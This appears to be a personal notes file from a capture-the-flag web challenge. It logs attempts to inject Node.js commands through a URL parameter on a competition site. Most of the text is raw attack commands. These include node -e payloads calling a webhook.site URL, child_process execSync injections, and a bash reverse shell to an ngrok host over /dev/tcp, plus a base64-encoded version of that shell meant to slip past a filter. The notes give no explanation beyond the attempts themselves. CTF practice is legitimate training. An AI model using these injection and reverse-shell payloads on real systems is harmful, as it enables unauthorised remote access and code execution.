## testing
```
https://compete.metactf.com/302/?auth=true&uid=1856312&tok=410cde24de52a2169334fbb11dd6edb3
&cal=node -e 'eval("require")("node-fetch")("https://webhook.site/41ec69bd-3f25-459a-94e7-b7a87fec9a97");
no get request to webhook site can be seen
may be outboud is not allowed
givs 403
the function looks like is being called
```
- this is not giving  403
```
https://compete.metactf.com/302/?auth=true&uid=1856312&tok=410cde24de52a2169334fbb11dd6edb3&cal=node -e '1'
```
- ngrok tcp 1234
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/0a865692-0156-4b56-a212-84b0310529ac)
- nc -lvp 1234
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/a41b3d73-3064-4e9d-b8a8-be94d956abd5)

```
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/17838 0>&1
```
### testing in local
```
C:\tmp\test> node -e "require('child_process').execSync('ls', {stdio:[0,1,2]});"
file1

C:\tmp\test>
```
### testing in url
```
https://compete.metactf.com/302/?auth=true&uid=1856312&tok=410cde24de52a2169334fbb11dd6edb3
&cal=node -e "require('child_process').execSync('ls', {stdio:[0,1,2]});"
--this is giving a 403
```

### try1
```
node -e "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/0.tcp.in.ngrok.io/17838 0>&1\"', {stdio:[0,1,2]});"
no connection back but 403
```
### try2
```
may be base64 encoding

C:\tmp> echo 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/17838 0>&1'|base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==

echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' |base64 -d|bash


node -e "require('child_process').execSync('bash -c \"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' |base64 -d|bash\"', {stdio:[0,1,2]});"
make some escape charcter addtion
node -e "require('child_process').execSync(\"bash -c 'echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNzgzOCAwPiYxCg==' | base64 -d | bash'\", {stdio:[0,1,2]});"

still not working in url ,but working locally

```
